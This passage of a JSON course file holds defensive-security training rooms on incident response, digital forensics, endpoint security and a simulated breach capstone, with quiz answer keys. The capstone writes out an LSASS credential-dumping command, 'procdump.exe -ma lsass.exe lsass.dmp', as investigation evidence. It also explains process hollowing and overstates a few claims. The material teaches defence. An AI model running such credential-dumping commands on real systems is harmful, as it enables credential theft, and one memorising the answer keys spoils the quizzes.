    "toolsAndCommands": [
      "ip link set down",
      "tar -czf",
      "ss -tulpn",
      "crontab -l"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Incident Triage & Containment Strategies",
        "concept": "When a high-severity alert confirms an active breach, responders follow a structured playbook:\n1. **Verify & Scope:** Confirm the alert is not a false positive. Query SIEM telemetry to identify all endpoints communicating with the same external C2 IP\n2. **Short-Term Containment:** Isolate the affected endpoints to halt lateral movement and data exfiltration. Use host-level EDR isolation (which blocks all traffic except the EDR management channel) rather than physically powering down the machine (which destroys volatile memory)\n3. **Preserve Volatile Artifacts:** Before modifying any files, execute automated forensic collection scripts (e.g. CyLR, KAPE, LiME) to dump RAM, process trees, network sockets, and event logs.",
        "whyItMatters": "Network isolation cuts off the attacker's interactive shell while allowing responders to conduct remote memory forensics.",
        "examples": [
          "EDR Network Isolation: Blocks ports 0-65535, retains agent connection to SOC",
          "Firewall Block: Null-routing attacker C2 IP on enterprise edge gateways"
        ],
        "commands": [
          {
            "cmd": "sudo ss -tulpn | grep ESTAB 2>/dev/null || ss -tan 'state established'",
            "desc": "Inspect live established network sockets on suspicious endpoints"
          }
        ],
        "guidedExercise": "Identify live established connections that indicate active attacker C2 sessions.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-29-1",
            "type": "multiple-choice",
            "question": "Why is network isolation via an EDR agent preferred over immediately pulling the physical power cord during an active malware incident?",
            "options": [
              "Pulling the power cord destroys volatile RAM data, losing decrypted malware keys and active process memory",
              "Network isolation increases the attacker's download speed",
              "Pulling the power cord breaks the computer's CPU warranty",
              "Computers cannot be turned off once infected"
            ],
            "correctIndex": 0,
            "hint": "Think about volatile RAM.",
            "explanation": "Pulling the power cord destroys volatile RAM, wiping in-memory malware, network connections, and cryptographic keys."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Eradication & Remediation Verification",
        "concept": "Once contained, responders begin **Eradication**:\n- Identify all persistence points (Registry Run keys, scheduled tasks, cron jobs, malicious browser extensions)\n- Terminate malicious processes and delete malware binaries\n- Revoke and reset all compromised user credentials and Kerberos Ticket Granting Service (TGS) account keys (e.g. resetting `krbtgt` password twice in Active Directory)\n- Deploy security patches for the initial access vulnerability.\n**Recovery:** Restore databases from verified pre-infection offline backups, re-image operating systems from trusted golden images, and enable heightened logging for 30 days.",
        "whyItMatters": "In Active Directory environments, failing to reset the `krbtgt` account twice allows attackers to forge Golden Tickets indefinitely.",
        "examples": [
          "Golden Ticket Remediation: Reset krbtgt password twice, separated by 10 hours for replication",
          "Re-imaging: Best practice is always re-imaging a compromised OS rather than attempting manual malware removal"
        ],
        "commands": [
          {
            "cmd": "crontab -l 2>/dev/null || echo 'No active user crontab'",
            "desc": "Check user persistence entries during eradication"
          }
        ],
        "guidedExercise": "Audit cron jobs and startup services to ensure no persistence backdoors remain.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-29-2",
            "type": "exact",
            "question": "What is the recommended industry best practice for restoring a heavily compromised operating system to ensure complete eradication of backdoors?",
            "visualSlots": "_ _ - _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "re-imaging",
              "reimaging",
              "re-image",
              "reimage"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Wiping and re-... from a gold master image.",
            "explanation": "Re-imaging from a trusted baseline guarantees complete removal of all rootkits and persistent backdoors."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Lessons Learned & Post-Mortem Review",
        "concept": "Within 14 days of incident resolution, convene the **Post-Incident Review (Post-Mortem)**:\n- Exactly what was the root cause of initial access?\n- Which detection rules fired, and which failed?\n- Did containment happen within established SLAs?\n- What technical and architectural improvements must be budgeted?",
        "whyItMatters": "The post-mortem report turns a costly breach into permanent architectural hardening.",
        "examples": [
          "Post-Mortem: Deliver root-cause analysis and actionable hardening recommendations to leadership"
        ],
        "commands": [
          {
            "cmd": "echo 'Incident Response Playbook Execution Mastered'",
            "desc": "Complete IR Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Live triage, host network isolation, volatile artifact preservation, eradication procedures (credential resets, re-imaging), and post-mortem reviews.",
          "technicalTakeaways": "Isolate hosts via EDR to preserve RAM for forensics. In Active Directory, reset krbtgt twice to invalidate forged Golden Tickets.",
          "commandsCovered": [
            "ss -tan",
            "crontab -l"
          ],
          "commonMistakes": "Rebuilding a system without discovering the initial access vector, leading to immediate reinfection.",
          "learningOutcome": "You can execute incident containment playbooks, preserve forensic memory, verify complete eradication, and lead post-mortems."
        },
        "questions": [
          {
            "id": "q-29-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Incident Detection and Response?",
            "options": [
              "Execute standardized incident response playbooks for ransomware and credential theft",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Execute standardized incident response playbooks for ransomware and credential theft is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-29-1",
        "type": "multiple-choice",
        "question": "Why is network isolation via an EDR agent preferred over immediately pulling the physical power cord during an active malware incident?",
        "options": [
          "Pulling the power cord destroys volatile RAM data, losing decrypted malware keys and active process memory",
          "Network isolation increases the attacker's download speed",
          "Pulling the power cord breaks the computer's CPU warranty",
          "Computers cannot be turned off once infected"
        ],
        "correctIndex": 0,
        "hint": "Think about volatile RAM.",
        "explanation": "Pulling the power cord destroys volatile RAM, wiping in-memory malware, network connections, and cryptographic keys."
      },
      {
        "id": "q-29-2",
        "type": "exact",
        "question": "What is the recommended industry best practice for restoring a heavily compromised operating system to ensure complete eradication of backdoors?",
        "visualSlots": "_ _ - _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "re-imaging",
          "reimaging",
          "re-image",
          "reimage"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Wiping and re-... from a gold master image.",
        "explanation": "Re-imaging from a trusted baseline guarantees complete removal of all rootkits and persistent backdoors."
      },
      {
        "id": "q-29-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Incident Detection and Response?",
        "options": [
          "Execute standardized incident response playbooks for ransomware and credential theft",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Execute standardized incident response playbooks for ransomware and credential theft is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Incident Triage & Containment Strategies",
        "instruction": "Identify live established connections that indicate active attacker C2 sessions.",
        "hints": [
          "Think about volatile RAM."
        ]
      },
      {
        "title": "Task 2: Eradication & Remediation Verification",
        "instruction": "Audit cron jobs and startup services to ensure no persistence backdoors remain.",
        "hints": [
          "Wiping and re-... from a gold master image."
        ]
      },
      {
        "title": "Task 3: Lessons Learned & Post-Mortem Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-30"
  },
  {
    "id": "room-30",
    "stageId": "defensive-security",
    "stageTitle": "Defensive Security",
    "stageOrder": 3,
    "stage": 3,
    "level": 3,
    "levelTitle": "Defensive Security",
    "roomNumber": 30,
    "title": "Digital Forensics Fundamentals",
    "description": "Master digital forensic acquisition: memory dumping, bit-stream disk imaging (dd/dcfldd), write-blockers, and file carving (scalpel/foremost).",
    "difficulty": "Intermediate",
    "difficultyBadge": "Intermediate",
    "estimatedTime": "40 mins",
    "xpReward": 50,
    "prerequisites": "room-29",
    "whyAreYouHere": "Master digital forensic acquisition: memory dumping, bit-stream disk imaging (dd/dcfldd), write-blockers, and file carving (scalpel/foremost).",
    "objectives": [
      "Differentiate forensic disk acquisition from standard file copying",
      "Use hardware write-blockers and generate verifiable cryptographic checksums",
      "Perform bit-stream disk acquisition using dd and dcfldd",
      "Extract deleted artifacts and hidden data using file carving tools"
    ],
    "skillsGained": [
      "Bit-Stream Imaging",
      "Write-Blockers",
      "Cryptographic Hashing",
      "File Carving"
    ],
    "toolsAndCommands": [
      "dd if=/dev/zero",
      "sha256sum",
      "file",
      "strings -a"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Forensic Disk Acquisition & Hardware Write-Blockers",
        "concept": "Digital forensics requires capturing an exact, bit-for-bit duplicate of storage media without modifying a single bit on the original drive. Simply plugging a suspect USB drive into a Windows workstation will cause the OS to write hidden system files (`System Volume Information`, `desktop.ini`), contaminating evidence!\nTo preserve evidence integrity:\n1. **Hardware Write-Blockers:** Interposed physically between the suspect drive and forensic workstation, permitting read commands while intercepting and discarding all write signals\n2. **Cryptographic Hashes:** Calculate MD5/SHA-256 of the physical drive *before* imaging, and calculate the hash of the resulting `.dd` image *after* imaging. If the hashes match exactly, the image is mathematically identical and legally admissible.",
        "whyItMatters": "A forensic image includes deleted file records in unallocated clusters, slack space, and partition tables.",
        "examples": [
          "Standard Copy (cp / xcopy): Copies active files only; loses deleted files, timestamps, and metadata",
          "Bit-Stream Forensic Image (dd): Copies every physical sector sequentially from sector 0 to the final sector"
        ],
        "commands": [
          {
            "cmd": "dd if=/dev/zero of=/tmp/evidence.img bs=1M count=10 2>/dev/null",
            "desc": "Create a dummy 10MB raw disk image for forensic testing"
          }
        ],
        "guidedExercise": "Create a raw disk container and compute its SHA-256 checksum.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-30-1",
            "type": "multiple-choice",
            "question": "What is the critical hardware device connected between a suspect drive and a forensic workstation to prevent the workstation OS from modifying drive contents?",
            "options": [
              "USB Hub",
              "Hardware Write-Blocker",
              "Ethernet Switch",
              "HDMI Splitter"
            ],
            "correctIndex": 1,
            "hint": "Blocks write commands at the hardware layer.",
            "explanation": "A hardware write-blocker prevents any write signals from reaching the suspect evidence media."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Bit-Stream Imaging (dd / dcfldd) & File Carving",
        "concept": "Forensic imaging utilizes the UNIX `dd` utility or specialized forks like `dcfldd`:\n`sudo dcfldd if=/dev/sdb of=/evidence/suspect_drive.dd hash=sha256 hashlog=hashes.txt`\n**File Carving:** When an attacker deletes a file, the operating system simply marks the file's index entry as 'deleted' in the Master File Table (MFT) or inode table, while the actual data remains intact on disk in **Unallocated Space** until overwritten. File carving tools (like `foremost` or `scalpel`) scan unallocated sectors for known file headers (magic bytes) and footers:\n- JPEG: Header `\u00ff\u00d8\u00ff`, Footer `\u00ff\u00d9`\n- PDF: Header `%PDF`, Footer `%%EOF`\n- PNG: Header `\u0089PNG\r\n\u001a\n`.",
        "whyItMatters": "File carving recovers deleted documents and hidden malware even after a drive has been quick-formatted.",
        "examples": [
          "Magic Bytes: First few bytes of a file identifying its format regardless of extension",
          "foremost -t pdf -i image.dd: Extracts all deleted PDF documents from raw disk sectors"
        ],
        "commands": [
          {
            "cmd": "file /tmp/evidence.img",
            "desc": "Inspect image file characteristics using magic byte analysis"
          }
        ],
        "guidedExercise": "Use magic byte identification to verify file signatures.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-30-2",
            "type": "exact",
            "question": "What forensic technique recovers deleted files from raw unallocated disk space by scanning for known file headers and footers without relying on filesystem metadata?",
            "visualSlots": "_ _ _ _   _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "file carving",
              "carving",
              "file-carving"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Carving files out of raw sectors.",
            "explanation": "File carving inspects raw bytes for signature headers and footers to reconstruct deleted files."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Strings Extraction & Forensic Analysis Review",
        "concept": "The `strings -a` command scans binary files and raw disk images for printable ASCII and Unicode text strings, exposing hardcoded IP addresses, URLs, passwords, and IRC/C2 commands without executing the file.",
        "whyItMatters": "Running strings against an unknown binary is a primary initial triage step in malware forensics.",
        "examples": [
          "strings -a suspect.exe | grep -E 'http|\\.com': Reveals embedded C2 domains"
        ],
        "commands": [
          {
            "cmd": "strings -a /bin/ls | head -n 10",
            "desc": "Extract printable strings from an ELF binary"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Bit-stream forensic imaging vs file copying, hardware write-blockers, hash verification, and file carving (magic bytes).",
          "technicalTakeaways": "Write-blockers preserve physical evidence; bit-stream imaging copies unallocated space. File carving recovers deleted files by header/footer signatures.",
          "commandsCovered": [
            "dd",
            "dcfldd",
            "sha256sum",
            "file",
            "strings -a"
          ],
          "commonMistakes": "Plugging evidence directly into a machine without a write-blocker, destroying original timestamps.",
          "learningOutcome": "You can perform forensic bit-stream disk acquisition, verify evidence hashes, and carve deleted files from raw disk images."
        },
        "questions": [
          {
            "id": "q-30-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Digital Forensics Fundamentals?",
            "options": [
              "Differentiate forensic disk acquisition from standard file copying",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Differentiate forensic disk acquisition from standard file copying is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-30-1",
        "type": "multiple-choice",
        "question": "What is the critical hardware device connected between a suspect drive and a forensic workstation to prevent the workstation OS from modifying drive contents?",
        "options": [
          "USB Hub",
          "Hardware Write-Blocker",
          "Ethernet Switch",
          "HDMI Splitter"
        ],
        "correctIndex": 1,
        "hint": "Blocks write commands at the hardware layer.",
        "explanation": "A hardware write-blocker prevents any write signals from reaching the suspect evidence media."
      },
      {
        "id": "q-30-2",
        "type": "exact",
        "question": "What forensic technique recovers deleted files from raw unallocated disk space by scanning for known file headers and footers without relying on filesystem metadata?",
        "visualSlots": "_ _ _ _   _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "file carving",
          "carving",
          "file-carving"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Carving files out of raw sectors.",
        "explanation": "File carving inspects raw bytes for signature headers and footers to reconstruct deleted files."
      },
      {
        "id": "q-30-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Digital Forensics Fundamentals?",
        "options": [
          "Differentiate forensic disk acquisition from standard file copying",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Differentiate forensic disk acquisition from standard file copying is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Forensic Disk Acquisition & Hardware Write-Blockers",
        "instruction": "Create a raw disk container and compute its SHA-256 checksum.",
        "hints": [
          "Blocks write commands at the hardware layer."
        ]
      },
      {
        "title": "Task 2: Bit-Stream Imaging (dd / dcfldd) & File Carving",
        "instruction": "Use magic byte identification to verify file signatures.",
        "hints": [
          "Carving files out of raw sectors."
        ]
      },
      {
        "title": "Task 3: Strings Extraction & Forensic Analysis Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-31"
  },
  {
    "id": "room-31",
    "stageId": "defensive-security",
    "stageTitle": "Defensive Security",
    "stageOrder": 3,
    "stage": 3,
    "level": 3,
    "levelTitle": "Defensive Security",
    "roomNumber": 31,
    "title": "Endpoint Security",
    "description": "Master modern endpoint protection: Antivirus signatures vs Endpoint Detection & Response (EDR), behavioral heuristics, and memory injection detection.",
    "difficulty": "Intermediate",
    "difficultyBadge": "Intermediate",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-30",
    "whyAreYouHere": "Master modern endpoint protection: Antivirus signatures vs Endpoint Detection & Response (EDR), behavioral heuristics, and memory injection detection.",
    "objectives": [
      "Compare signature-based Antivirus (AV) with behavioral Endpoint Detection and Response (EDR)",
      "Analyze process injection techniques: Process Hollowing and DLL Injection",
      "Configure Windows Defender Application Control (WDAC) and AppLocker",
      "Inspect live endpoint process memory using Volatility and Sysinternals"
    ],
    "skillsGained": [
      "AV vs EDR",
      "Process Injection Mechanics",
      "Application Whitelisting",
      "Process Memory Forensics"
    ],
    "toolsAndCommands": [
      "ps aux",
      "systemctl status",
      "top -b -n 1",
      "pgrep"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Antivirus (AV) vs Endpoint Detection and Response (EDR)",
        "concept": "Endpoint defense has undergone a generational shift:\n- **Legacy Antivirus (AV):** Relies primarily on **static signatures** (MD5/SHA-256 hashes or byte sequences) and basic heuristics. Trivial for attackers to bypass using crypters, code obfuscation, or recompilation\n- **Endpoint Detection and Response (EDR):** Operates via a low-level kernel driver (e.g. CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne) that continuously monitors **behavioral telemetry** in real-time:\n  - Process creation relationships (parent-child lineages)\n  - Memory injection API calls (`VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`)\n  - Network connections initiated by non-browser binaries\n  - Registry modifications and LSASS memory access.\nEven if malware is completely unknown (zero-day) with a novel hash, EDR detects and blocks it based on malicious behavior.",
        "whyItMatters": "EDR detects the malicious action (e.g. Word spawning PowerShell), rendering static hash obfuscation irrelevant.",
        "examples": [
          "Legacy AV: Flags file if hash matches known database; misses novel compilation",
          "EDR: Flags `excel.exe` spawning `rundll32.exe` to connect to an external IP"
        ],
        "commands": [
          {
            "cmd": "ps aux | head -n 10",
            "desc": "View process table and parent command lineages"
          }
        ],
        "guidedExercise": "Observe how operating systems track process execution hierarchies.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-31-1",
            "type": "multiple-choice",
            "question": "What is the primary architectural advantage of Endpoint Detection and Response (EDR) over legacy static Antivirus?",
            "options": [
              "EDR only works when disconnected from the Internet",
              "EDR monitors real-time behavioral telemetry and process actions, detecting novel zero-day attacks even if file hashes are unknown",
              "EDR replaces all computer memory with cloud storage",
              "EDR makes computer cooling fans spin quieter"
            ],
            "correctIndex": 1,
            "hint": "Focuses on behavior rather than static file hashes.",
            "explanation": "EDR continuously analyzes behavioral activity in real time, detecting malicious actions regardless of static signatures."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Process Injection & Memory Defense",
        "concept": "Advanced malware avoids writing files to disk (fileless malware) by injecting malicious code directly into legitimate running operating system processes:\n- **DLL Injection:** Forcing a target process (like `explorer.exe`) to load a malicious DLL using `LoadLibrary`\n- **Process Hollowing:** Spawning a legitimate system process (e.g. `svchost.exe`) in a suspended state, unmapping its original code from memory, writing malicious payload into the hollowed memory space, and resuming the thread.\nModern EDRs monitor Windows kernel APIs via Event Tracing for Windows (ETW) and kernel callbacks to detect when a process attempts to write into foreign memory spaces.",
        "whyItMatters": "Process hollowing makes malicious network traffic appear to originate from legitimate system processes like svchost.exe.",
        "examples": [
          "Process Hollowing: svchost.exe (hollowed) opens outbound reverse shell on port 443",
          "LSASS Dumping: Malware injects into lsass.exe to read cached NTLM password hashes"
        ],
        "commands": [
          {
            "cmd": "pgrep -l systemd",
            "desc": "Check PID and process name of system init process"
          }
        ],
        "guidedExercise": "Inspect legitimate system process identities in memory.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-31-2",
            "type": "exact",
            "question": "What evasion technique involves launching a legitimate system process in a suspended state, replacing its code in memory with malware, and resuming execution?",
            "visualSlots": "_ _ _ _ _ _ _   _ _ _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "process hollowing",
              "process-hollowing"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Process ...ing (emptying out the core).",
            "explanation": "Process Hollowing carves out a legitimate process's memory to execute stealthy malware under its identity."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Application Whitelisting & Endpoint Hardening Review",
        "concept": "The most effective defensive control against unauthorized execution is **Application Whitelisting** (e.g. Windows Defender Application Control / WDAC, AppLocker). Whitelisting dictates that ONLY explicitly approved, cryptographically signed executables and scripts can run; all other software is blocked by default.",
        "whyItMatters": "Application whitelisting renders standard malware execution impossible.",
        "examples": [
          "Default Deny: Only binaries signed by Microsoft or corporate enterprise PKI are permitted to execute"
        ],
        "commands": [
          {
            "cmd": "echo 'Endpoint Security Architecture Mastered'",
            "desc": "Complete Endpoint Security Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Antivirus signatures vs EDR behavioral telemetry, process injection mechanics (Process Hollowing, DLL Injection), and Application Whitelisting.",
          "technicalTakeaways": "EDR detects behavioral anomalies (parent-child lineages, memory allocation). Application whitelisting enforces a default-deny execution policy.",
          "commandsCovered": [
            "ps aux",
            "pgrep"
          ],
          "commonMistakes": "Assuming antivirus protects against fileless in-memory process hollowing attacks.",
          "learningOutcome": "You can differentiate AV from EDR, explain process injection techniques, and design endpoint application whitelisting policies."
        },
        "questions": [
          {
            "id": "q-31-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Endpoint Security?",
            "options": [
              "Compare signature-based Antivirus (AV) with behavioral Endpoint Detection and Response (EDR)",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Compare signature-based Antivirus (AV) with behavioral Endpoint Detection and Response (EDR) is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-31-1",
        "type": "multiple-choice",
        "question": "What is the primary architectural advantage of Endpoint Detection and Response (EDR) over legacy static Antivirus?",
        "options": [
          "EDR only works when disconnected from the Internet",
          "EDR monitors real-time behavioral telemetry and process actions, detecting novel zero-day attacks even if file hashes are unknown",
          "EDR replaces all computer memory with cloud storage",
          "EDR makes computer cooling fans spin quieter"
        ],
        "correctIndex": 1,
        "hint": "Focuses on behavior rather than static file hashes.",
        "explanation": "EDR continuously analyzes behavioral activity in real time, detecting malicious actions regardless of static signatures."
      },
      {
        "id": "q-31-2",
        "type": "exact",
        "question": "What evasion technique involves launching a legitimate system process in a suspended state, replacing its code in memory with malware, and resuming execution?",
        "visualSlots": "_ _ _ _ _ _ _   _ _ _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "process hollowing",
          "process-hollowing"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Process ...ing (emptying out the core).",
        "explanation": "Process Hollowing carves out a legitimate process's memory to execute stealthy malware under its identity."
      },
      {
        "id": "q-31-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Endpoint Security?",
        "options": [
          "Compare signature-based Antivirus (AV) with behavioral Endpoint Detection and Response (EDR)",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Compare signature-based Antivirus (AV) with behavioral Endpoint Detection and Response (EDR) is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Antivirus (AV) vs Endpoint Detection and Response (EDR)",
        "instruction": "Observe how operating systems track process execution hierarchies.",
        "hints": [
          "Focuses on behavior rather than static file hashes."
        ]
      },
      {
        "title": "Task 2: Process Injection & Memory Defense",
        "instruction": "Inspect legitimate system process identities in memory.",
        "hints": [
          "Process ...ing (emptying out the core)."
        ]
      },
      {
        "title": "Task 3: Application Whitelisting & Endpoint Hardening Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-32"
  },
  {
    "id": "room-32",
    "stageId": "defensive-security",
    "stageTitle": "Defensive Security",
    "stageOrder": 3,
    "stage": 3,
    "level": 3,
    "levelTitle": "Defensive Security",
    "roomNumber": 32,
    "title": "Defensive Security Capstone",
    "description": "Synthesize your complete defensive training: investigate a simulated enterprise breach across network, endpoint, and SIEM logs, contain the adversary, and formulate remediation.",
    "difficulty": "Intermediate",
    "difficultyBadge": "Intermediate",
    "estimatedTime": "45 mins",
    "xpReward": 50,
    "prerequisites": "room-31",
    "whyAreYouHere": "Synthesize your complete defensive training: investigate a simulated enterprise breach across network, endpoint, and SIEM logs, contain the adversary, and formulate remediation.",
    "objectives": [
      "Correlate a full multi-stage enterprise breach across firewall, syslog, and Windows events",
      "Identify the initial access phishing vector and infected host",
      "Trace lateral movement and credential dumping activities",
      "Execute containment, formulate an incident report, and deliver architectural hardening"
    ],
    "skillsGained": [
      "Full Incident Synthesis",
      "Cross-Log Correlation",
      "Breach Reconstruction",
      "Remediation Reporting"
    ],
    "toolsAndCommands": [
      "grep -r",
      "awk",
      "last",
      "sha256sum"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Breach Scenario: Phase 1 & 2 - Initial Access & Execution",
        "concept": "**Mission Briefing:** You are the Lead Incident Responder for Apex Global Logistics. At 08:42 UTC, the SOC triggers a critical alert: *Anomalous outbound encrypted connection to an unclassified IP (198.51.100.25) on port 443*. Your task is to investigate the intrusion from initial access to lateral movement and deliver complete containment.\n**Initial Evidence Analysis:**\n1. Web proxy logs show User `jdoe` received an email with link `http://billing-update.com/invoice.zip`\n2. The zip contained `invoice.pdf.exe`\n3. Windows Security log shows Event ID 4688: `invoice.pdf.exe` spawned `powershell.exe -enc ...`\n4. Sysmon Event ID 3 confirms `powershell.exe` established an outbound connection to `198.51.100.25:443` (C2 server).",
        "whyItMatters": "Tracing the parent-child lineage in Sysmon Event ID 1 immediately reveals the executable that opened the backdoor.",
        "examples": [
          "Initial Access: Spear-phishing link -> Execution: Double-extension executable -> C2: Encrypted beaconing"
        ],
        "commands": [
          {
            "cmd": "echo 'Apex Global Logistics Incident: Host WS-042 Compromised'",
            "desc": "Review breach briefing"
          }
        ],
        "guidedExercise": "Inspect the evidence timeline from initial user click to active C2 beaconing.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-32-1",
            "type": "multiple-choice",
            "question": "Based on the evidence briefing, what was the adversary's Initial Access vector into the network?",
            "options": [
              "SQL Injection on the public website",
              "Spear-phishing email containing a link to a malicious executable disguised as an invoice",
              "Physical break-in to the datacenter",
              "BGP route hijacking of the corporate DNS"
            ],
            "correctIndex": 1,
            "hint": "Look at the user email activity.",
            "explanation": "The initial access vector was spear-phishing delivering a masqueraded executable (invoice.pdf.exe)."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Phase 3 & 4 - Lateral Movement & Containment Execution",
        "concept": "**Escalation Investigation:**\n1. At 09:15 UTC, Sysmon logs on `WS-042` reveal `procdump.exe -ma lsass.exe lsass.dmp` (Credential Access via LSASS memory dumping)\n2. At 09:30 UTC, Security Event ID 4624 (Logon Type 3: Network) fires on internal File Server `FS-001`, logging in with stolen Domain Admin credentials `svc_admin` from `WS-042`\n3. At 09:35 UTC, System Event ID 7045 on `FS-001` records the installation of a new service: `PSEXESVC.exe`.\n**Containment Actions:**\n- Isolate workstation `WS-042` and server `FS-001` via EDR\n- Block IP `198.51.100.25` at the edge firewall\n- Disable and reset credentials for `svc_admin` and `jdoe`\n- Reset Active Directory `krbtgt` password twice.",
        "whyItMatters": "Containing both the compromised workstation and the lateral target prevents ransomware deployment.",
        "examples": [
          "Lateral Movement: PsExec over SMB port 445 -> Credential Access: LSASS memory dump"
        ],
        "commands": [
          {
            "cmd": "echo 'Containment Playbook: Isolate WS-042, Block C2 IP, Reset svc_admin'",
            "desc": "Execute containment steps"
          }
        ],
        "guidedExercise": "Review the sequence of lateral movement and execute the containment protocol.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-32-2",
            "type": "exact",
            "question": "Which Windows process memory was dumped by the adversary on WS-042 to extract plaintext and hashed domain credentials?",
            "visualSlots": "_ _ _ _ _ . _ _ _",
            "acceptedAnswers": [
              "lsass.exe",
              "lsass"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Local Security Authority Subsystem Service executable.",
            "explanation": "lsass.exe holds cached authentication tokens, Kerberos tickets, and NTLM hashes in memory."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Defensive Security Capstone Review & Transition to Offense",
        "concept": "Congratulations! You successfully triaged the incident, traced the root cause to spear-phishing, identified LSASS credential dumping and PsExec lateral movement, and executed complete containment.\nYou have now mastered Stage 3: **Defensive Security**!\nHaving learned how to monitor, investigate, and defend corporate networks, you are now prepared to learn how authorized ethical penetration testers discover these exact vulnerabilities in **Stage 4: Offensive Security**.",
        "whyItMatters": "To be a world-class defender, you must understand the offensive techniques used by adversaries.",
        "examples": [
          "Next: Stage 4 - Ethical Hacking, Network Reconnaissance, Web Security Testing, and Exploitation"
        ],
        "commands": [
          {
            "cmd": "echo 'Stage 3 (Defensive Security) Complete! Entering Stage 4.'",
            "desc": "Celebrate Capstone Completion"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Comprehensive breach investigation, phishing triage, LSASS credential theft, lateral movement (PsExec), and incident containment.",
